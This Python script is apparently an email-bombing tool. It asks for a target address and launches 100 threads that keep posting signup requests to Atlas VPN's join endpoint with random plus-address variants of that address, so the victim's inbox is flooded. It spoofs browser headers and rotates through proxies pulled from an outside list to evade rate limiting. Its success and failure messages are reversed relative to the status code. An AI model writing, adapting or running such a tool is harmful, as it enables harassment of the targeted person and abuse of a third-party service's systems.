import requests
import random
import threading

def send_requests(email, thread_num):
    at_index = email.index('@')
    part1 = email[:at_index]
    part2 = email[at_index:]
    i = 0
    proxy_index = 0
    proxies = requests.get('https://cdn.droplets.cf/http-proxies.txt').text.strip().split('\n')
    while True:
        mail = f"{part1}+{random.randint(1, 30000)}{part2}"
        if i % 50 == 0:
            proxy_index = random.randint(0, len(proxies)-1)
        proxy = {'http': proxies[proxy_index], 'https': proxies[proxy_index]}
        try:
            response = requests.post('https://user.atlasvpn.com/v1/request/join', headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0',
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Content-Type': 'application/json;charset=utf-8',
                'X-Client-ID': 'Web',
                'Origin': 'https://account.atlasvpn.com',
                'Connection': 'keep-alive',
                'Referer': 'https://account.atlasvpn.com/',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'DNT': '1',
                'Sec-GPC': '1',
                'TE': 'trailers'
            }, json={
                'email': mail
            }, proxies=proxy)
            if response.status_code == 200:
                print(f"[{thread_num}:{i}] Failed to send request for {mail}. Status code: {response.status_code}")
            else:
                print(f"[Thread: {thread_num}  Email:{i}] Successfully sent email.")
        except:
            print(f"[Thread: {thread_num}  Email:{i}] Failed to send email using proxy: {proxy}")
        i += 1

def main():
    email = input("Enter email: ")
    threads = []
    for i in range(100):
        t = threading.Thread(target=send_requests, args=(email, i))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
